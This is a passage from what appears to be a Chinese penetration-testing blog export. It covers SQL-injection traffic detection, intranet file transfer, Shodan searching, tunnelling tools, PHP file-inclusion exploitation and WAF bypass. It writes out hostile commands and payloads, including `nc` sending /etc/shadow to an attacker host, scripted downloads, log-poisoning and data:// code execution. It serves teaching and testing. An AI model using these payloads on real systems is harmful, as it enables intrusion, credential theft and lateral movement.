print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src) print(&apos;[*]被攻击的地方和payload是\t&apos;+ str(ff).strip(&apos;b\&apos;&apos;).strip(&apos;HTTP/1.1&apos;)) print(&apos;[*]提交的方式为\tGET&apos;) try: printRecord(page.payload.src,page.payload.src) except: printRecord(&quot;114.242.146.98&quot;,page.payload.src) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n[*]攻击时间是\t%s\n [*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t GET\n\n&quot; % ( str(i),page.payload.src, str(ff))) except: pass def main(): sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0) if __name__ == &apos;__main__&apos;: main() sql.txt：提供特殊字段检测的字典。 Danger.log：如果有SQL注入攻击，则保存攻击时间、攻击者的IP、攻击的payload及攻击位置和提交的方式。 下载chromedriver并把chromedriver.exe放到跟代码相同目录下。 相关知识点：用Firefox打开本地地图并刷新。driver = webdriver.Firefox() driver.get(&apos;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&apos;) driver.refresh() 获取相应IP的城市国家经纬度等信息。gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) rec = gi.record_by_name(&quot;114.242.146.98&quot;) 态势地图的构建。geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000, background_color=&apos;#404a59&apos;) data = { &quot;北京&quot;: &quot;beijing&quot;, &quot;上海&quot;:&quot;shanghai&quot;,&quot;深圳&quot;:&quot;shenzhen&quot;,&quot;广州&quot;:&quot;guangzhou&quot;,&quot;厦门&quot;:&quot;xiamen&quot;,&quot;郑州&quot;:&quot;zhengzhou&quot;,&quot;西安&quot;:&quot;xian&quot;,&quot;乌鲁木齐&quot;:&quot;wulumuqi&quot;,&quot;沈阳&quot;:&quot;shenyang&quot;,&quot;济南&quot;:&quot;jinan&quot;, &quot;石家庄&quot;:&quot;shijiazhuang&quot;,&quot;哈尔滨&quot;:&quot;haerbing&quot;,&quot;成都&quot;:&quot;chengdu&quot;,&quot;昆明&quot;:&quot;kunming&quot;,&quot;武汉&quot;:&quot;wuhan&quot;,&quot;拉萨&quot;:&quot;lasa&quot;,&quot;南京&quot;:&quot;nanjing&quot;, &quot;兰州&quot;:&quot;lanzhou&quot;,&quot;南宁&quot;:&quot;nanning&quot;,&quot;呼和浩特&quot;:&quot;huhehaote&quot;,&quot;海口&quot;:&quot;haikou&quot;, &quot;贵阳&quot;:&quot;guiyang&quot;,&quot;西宁&quot;:&quot;xining&quot;,&quot;合肥&quot;:&quot;hefei&quot;,&quot;太原&quot;:&quot;taiyuan&quot; } attr, value = geo.cast(data) geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1) geo.render(path=&quot;map.html&quot;) 流量嗅探sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0) 关于数据包每一个协议层都是Packet类的子类。协议层背后所有逻辑的操作都是被Packet类和继承的类所处理的。一个简单的协议层是由一系列的字段构成，他们关联在一起组成了协议层，解析时拆分成一个一个的字符串。这些字段都包含在名为fields_desc的属性中。 第一层是数据链路层，第二层是ip层，第三层是tcp层——&gt;包含端口号、http报文,第四层是应用层其中每一层均为上一层的payload成员 # f.name为Raw的字段名称——&gt;load：传输的http请求信息 fvalue = page.payload.payload.getfieldval(f.name)#请求相关字段的值 总体功能启动代码自动用火狐打开本地检测地图，嗅探指定网卡和指定过滤规则的流量并传入回调函数test，在回调函数test中进行数据的拆分，并对比特殊字符字典：sql.txt，将可疑流量进一步拆分，获取攻击者的IP、攻击时间、攻击的位置和payload以及提交方式，并记录到danger.log，日志中。在分析到可疑流量的时候将攻击者IP传递到printRecord函数利用GeoIP进行解析IP，进而获取到攻击者所在的城市、国家、经纬度和攻击次数并保存到数据库中，同时利用pyecharts生成Echarts中国地图，并提取数据库中的攻击者信息在地图上标记攻击者所在地点、IP和攻击次数，如果数据更新，则利用selenium模块中的webdriver动态覆盖并刷新地图。]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网文件传输]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%2F</url>
    <content type="text"><![CDATA[文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。 实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。 开启FTP服务： 使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机 1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt //登陆FTP服务器 2、echo guoxiang&gt;&gt;1.txt //用户名 3、echo password&gt;&gt;1.txt //密码 4、echo bin&gt;&gt;1.txt //开始 5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt //下载程序 6、echo bye&gt;&gt;1.txt //关闭FTP服务器 然后执行ftp -s:1.txt 发现在ftp主机中出现了上传的文件。 用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。 VBSecho 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置 echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbs cscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exe putty.exe Powershellpowershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置） powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;) putty1.exe certaincertutil.exe -urlcache -split -f 远程文件位置 certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete //删除缓存 putty.exe Linux攻击端监听端口，并重定向： nc -nvv -lp 4455 &gt; shaodw.txt 目标机将文件内容回传： nc 192.168.111.251 4455 &lt; /etc/shadow Wget（下载）wget http://192.168.111.1:8080/test/putty.exe curl支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 curl -O http://192.168.111.1:8080/test/putty.exe]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎——永不过时的渗透神器]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%97%B6%E7%9A%84%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Google Hacking使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞搜索登录后台、特定文件、漏洞贡面、错误信息等等 逻辑运算符： +强制搜索其后的一个单词 -把某个字忽略 ~ 同意词博客设置 .单一的通配符 * 通配符，可代表多个字母 “” 精确查询 I 或 OR 只要符合多个关键字中的任意一个的结果予以显示 基本语法：intext:key 搜索网页带有关键字的页面 allintext:key 功能与intext，但是可以接多个关键字 intitle:key 搜索网页标题中是否有所输入的文字 allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用 Index of/(例如：index of/login) 使用它可以直接进入网站首页下的所有文件和文件夹中。（可以查看有没有目录遍历漏洞） cache:url 查看指定URL快照 filetype： 搜索指定类型文件 info： 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用 inurl： 搜索输入字符是否存在于URL中，可以与site结合找后台 site： 搜索特定网站或者子域名 related:URL 搜索与该URL相关的页面 Link： link:thief.one可以返回所有和thief.one做了链接的URL。 搜索不同地域网站 inurl:tw 台湾 inurl:jp 日本 Google hacking语法数据库https://www.exploit-db.com/google-hacking-database/ 利用Google搜索C段服务器信息site:218.87.21.* 通过google可获取218.87.21.0/24网络的服务信息。 网络空间搜索引擎网络空间搜索引擎不同于搜索普通网页，而是直接搜索网络中存在主机，将主机信息汇聚成数据库，然后显示出主机的IP、端口、中间件、摄像头，工控设备banner、等其他网络设备信息。 同时可以按照普通搜索引擎规则来搜索网络设备：ip:&quot;192.168.1.0&quot;。 常见的搜索引擎：用法大多相同，这里只写shodan的用法。其他类比。 国内： zoomeye：（https://www.zoomeye.org/） fofa 国外： shodan（俗称黑暗谷歌） shodanhttps://www.shodan.io/ shoadn一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。 凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到 shodan可以在windows下网页中运行，也可以在linux下安装运行。 基本语法： hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 vgeo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”v net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” http.favicon.hash方法可以来搜索使用同一icon图标的网站。如果我想搜索带有这个icon的所有ip地址的话，可以先在Shodan搜索这个ip，这里要用到一个之前没注意到的东西，就是Shodan的原始数据（Raw Data）功能， 这里面有很多原始数据。 从中找到相应：data.0.http.favicon.hash字段 通过命令： http.favicon.hash:600245583 命令： net:&quot;114.242.146.0/24&quot; 命令： os:&quot;windows 7&quot; country:&quot;CN&quot; city:&quot;beijing&quot; 不仅可以运用标准操作。还可以直接搜索功能 在linux下得先对shodan进行安装pip install shodan 然后初始化shodan shodan init ‘key’ 这里的key是注册shodan账号时候给你的 count：统计结果 download：下载数据，数据格式json shodan parse --fields ip_str,port waiwang.json parse：解析json数据。 而且只取ip_str和port字段的值 shodan parse --fields ip_str,port waiwang.json |grep 80 shodan host 114.242.146.192 host：搜索指定IP shodan myip shodan search --fields ip_str,port net:&apos;114.242.146.0/24&apos; search：搜索内容]]></content>
      <categories>
        <category>Google Hacking</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网渗透——端口转发工具]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Htranhttps://github.com/zcnhonker/HTran 正向端口转发服务端 htran.exe -tran 8888 192.168.1.1 3389 客户端 nc 服务端IP:8888 反向端口转发攻击机 htran.exe -listen 1234 8888 服务端 htran.exe -slave 攻击机IP 1234 127.0.0.1 3389 客户端 nc 127.0.0.1：8888 lcxhttps://guolala.top/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/ Netshnetsh(Network Shell) 是一个windows系统本身提供的功能强大的网络配置命令行工具 Ipv4地址，转发本地8001端口到192.168.1.1的80端口 netsh interface portproxy add v4tov4 listenport=8001 connectport=80 connectaddress=192.168.1.1 删除转发规则 netsh interface portproxy delete v4tov4 listenport=9090查看现有规则 netsh interface portproxy show all 查看防火墙状态 netsh firewall show state netsh firewall set opmode disable 关闭防火墙 netsh firewall set opmode enable 启用防火墙 FpipeFPipe 是一款命令行下的端口映射工具，可以映射 TCP/UDP 协议，支持连接数的最大上限. 转发本地1080端口到远程的52345端口： FPipe.exe -l 1080 -r 52345 192.168.1.1 -v socks代理Socks代理相对端口转发更万便一些 reGeorgwindows下https://github.com/sensepost/reGeorg.git 这款工具的主要特点是服务端通常是一些web应用，例如php、aspx脚本。这样在目标仅仅开启了web服务的情况下我们也能做一个正向的socks代理。 它利用webshell建立一个socks代理进行内网穿透。 使用reGeorg需要安装setuptools（windows）和ez_setup.py（linux） https://pypi.python.org/pypi/setuptools#windows-simplified https://bootstrap.pypa.io/ez_setup.py 将setuptools 复制到 C:\Python27\（复制到python安装根目录）在命令提示符下切换到C:\Python27\，依次运行如下命令。 python setup.py build python setup.py install setuptools包含了pip，可直接用pip安装urllib3模块。命令提示符下切换到C:\Python27\Scripts，直接运行pip install urllib3 reGeorg工具安装完成。 使用参数 -h 帮助 -l 监听地址 -p 转发端口 -r 本地缓冲区，最大发送数据 -u 上传reGeorg脚本的地址 -v 详细显示 使用方法： 将下载内容的tunnel.jsp压缩（看网站），通过weblogic（各种文件上传）上传至服务器。 本地建立一个socks代理 切换到C:\Python27\，运行: python reGeorgSocksProxy.py -p 2333 -u http://192.168.209.159:7001/tunnel/tunnel.jsp 再用proxifier配置服务器 将python.exe添加列外，不然会死循环。 reGeorg在设计初，并未考虑Java中间件的问题，测试结果暂时支持Tomcat，所以如果服务器是Weblogic等中间件时候，可能会造成暂时无法访问3389远程桌面，或者卡在远程桌面 kali下使用代理vi proxychains.conf //编辑配置文件 dynamic_chain //取消此注释 socks5 127.0.0.1 7070 //添加代理 proxychains firefox proxychains nmap -vvv -n -sT -PN -p 80 192.168.0.1-255 rtcp.py利用 Python 的 Socket 端口转发，用于远程维护 如果连接不到远程，会 sleep 36s，最多尝试 200 次（即两小时） https://github.com/knownsec/rtcp 用法： ./rtcp.py stream1 stream2 stream 为：l:port 或 c:host:port l:port 表示监听指定的本地端口 c:host:port 表示监听远程指定的端口 转发本地8080端口到192.168.1.1的80端口 /rtcp.py 1:8080 c:192.168.1.1:80 使用场景： A 服务器在内网，公网无法直接访问这台服务器，但是 A 服务器可以联网访问公网的 B 服务器（假设 IP 为 222.2.2.2） 我们也可以访问公网的 B 服务器。我们的目标是访问 A 服务器的 22 端口。那么可以这样： 在 B 服务器上运行：./rtcp.py l:10001 l:10002 表示在本地监听了 10001 与 10002 两个端口，这样，这两个端口就可以互相传输数据了 在 A 服务器上运行：./rtcp.py c:localhost:22 c:222.2.2.2:10001 表示连接本地的 22 端口与 B 服务器的 10001 端口，这两个端口也可以互相传输数据了 然后我们就可以这样来访问 A 服务器的 22 端口了：ssh -p 10002 222.2.2.2 原理很简单，这个命令执行后，B 服务器的 10002 端口接收到的任何数据都会传给 10001 端口 此时，A 服务器是连接了 B 服务器的 10001 端口的，数据就会传给 A 服务器，最终进入 A 服务器的 22 端口 ssh+putty转发先安装： apt-get install putty 打开putty，配置SSH 配置SSH隧道 连接SSH并登录，保持窗口不关闭 访问8888端口——&gt;7001端口。 socat转发安装socat apt-get install socat 添加转发规则 socat TCP4-LISTEN:7777,reuseaddr,fork TCP4:192.168.0.92:7001 访问7777——&gt;7001. Earthworm：跨平台内网穿透神器基于标准C开发，具有socks5代理、端口转发和端口映射三大功能。 支持多平台，可穿透复杂的内网环境 https://github.com/rootkiter/EarthWorm 使用方法： -h 查看帮助 -s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran) ssocksd：正向socks5代理连接; rcsocks、rssocks：反向socks5代理连接; lcx_slave、lcx_listen：端口转发; lcx_tran：端口映射 -l 开放指定端口监听 -d 指定转发或反弹的主机地址 -e 指定转发或反弹的主机端口 -f 指定连接或映射的主机地址 -g 指定连接或映射的主机端口 -t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，-h显示有误)； -v 显示版本； -a 显示关于页面； 正向socks5代理(适用于目标拥有公网ip且可任意开监听端口)ew_for_Win.exe -s ssocksd -l 1080 在公网主机1.1.1.1上运行并开启端口为1080的socks5代理。 通过proxifier等代理工具访问1.1.1.1:1080使用1.1.1.1主机提供的socks5代理服务. 反向socks5代理(适用于目标无公网ip但可访问外网)：先在一台具有公网 ip 的主机A上运行以下命令： 在公网主机上添加转接隧道，将1080端口收到的代理请求转交给反弹到8888端口的主机。 相通机器：ew_for_Win.exe -s rcsocks -l 1080 -e 8888 将rcsocks改成lcx_listen也同样有效 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口： 在目标主机上开启socks5代理并反向连接到公网主机1.1.1.1的8888端口上。 目标主机：ew_for_Win.exe -s rssocks -d 1.1.1.1 -e 8888 通过proxifier等代理工具访问1.1.1.1:1080使用rssocks主机提供的socks5代理服务。 多级级联lcx_slave、lcx_listen、lcx_tran用法跟lcx一样。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞详解]]></title>
    <url>%2F2018%2F12%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 接下来的测试会用下面这个非常简单的代码进行： &lt;?php $file = $_GET[&apos;file&apos;]; include $file; ?&gt; 同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;） 文件包含有两种：本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。） 漏洞成因：程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[‘file’];。 php的文件包含利用在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 读取敏感文件访问：http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。 远程包含shell allow_url_fopen = On allow_url_include = On 在远程文件http://10.60.17.60里写入测试代码。 &lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt; 访问http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：”&lt;?php phpinfo(); ?&gt;“ 图片上传并包含图片shell利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。 SSH log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码： 之后进行文件包含即可。 包含日志文件GetShell利用条件：需要知道服务器日志的存储路径，且日志文件可读。 既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell） 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改. 正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ index.php?file=././././省略././shell.txt 0字节截断包含利用条件： php版本 &lt; php 5.3.4 测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/tasdas/asd.php&apos;; ?&gt; http://127.0.0.1/123.php?file=phpinfo.txt%00 正常上传图片一句话并访问：http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中magic_quotes_qpc=off并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。 伪协议PHP伪协议其实就是PHP支持的协议和封装的协议， file: — 访问本地文件系统 http: — 访问 HTTP(s) 网址 ftp: — 访问 FTP(s) URLs php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】 zlib: — 压缩流 data: — 数据（RFC 2397） glob: — 查找匹配的文件路径模式 phar: — PHP 归档 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 有两个比较重要的配置在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。 File://用于访问文件系统。（可用于任意文件执行），在allow_url_fopen 和allow_url_include任何状态下都可以用。 data:// php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 任意命令执行 http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt; 利用base64编码绕过 http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; phar://php版本大于等于php5.3.0 在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。 使用绝对路径： http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 或者使用相对路径： http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt zip:// – zlib:// –bzip2:// –zip://php版本大于等于php5.3.0 构造zip包的方法同phar 但是使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt http://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txt http://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt 压缩流：在allow_url_fopen 和allow_url_include任何状态下都可以用。 使用方法： http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txt http://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txt http://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpg http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg 另一种思路：将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。 PHP://inputallow_url_include = On。 对allow_url_fopen不做要求。 可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果enctype=”multipart/form-data” 的时候 php://input 是无效的。 php://outputphp://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 php://filter对allow_url_include 和allow_url_fopen不做要求。 在任意文件读取或者getshell会用到这个伪协议。 http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php 效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。 php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。 在include函数使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。 php://filter 目标使用以下的参数作为它路径的一部分: resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 目录遍历现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。 http://127.0.0.1/123.php?file=../phpinfo.txt 实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt 编码绕过服务器端常常会对于 ../ 等做一些过滤，可以用一些编码来进行绕过。 利用url编码 ../： %2e%2e%2f ..%2f %2e%2e/ ..\： %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../： %252e%252e%252f ..\： %252e%252e%255c 容器/服务器的编码方式 ../： ..%c0%af %c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）） ..\： ..%c1%9c 利用协议测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/test/test.php&apos;; ?&gt; 构造压缩包结构如下： http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23test http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip 利用zip协议，注意要指定绝对路径 则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php 变量覆盖$$导致的变量覆盖，举个例子 $key = ‘hello’ $hello = ‘world’ echo $$key 输出world 文件包含修复方案 禁止远程文件包含： allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL的WAF绕过]]></title>
    <url>%2F2018%2F12%2F02%2FSQL%E7%9A%84WAF%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 WAF常见特点 异常检测协议：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 WAF识别扫描器 1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识 2) 单IP+ cookie某时间段内触发规则次数 3) 隐藏的链接标签等(&lt;a&gt;) 4） Cookie植入 5) 验证码验证，扫描器无法自动填充验证码 6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏 WAF绕过思路根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。 大小写绕过这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。 编码绕过比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用%55也就是U的16进制编码来代替U，union写成 %55nION，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。 也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。 ####（1）URL编码： 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29，/为%25。 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过： ?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT ####（2）十六进制编码： /index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 ####（3）Unicode编码： Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 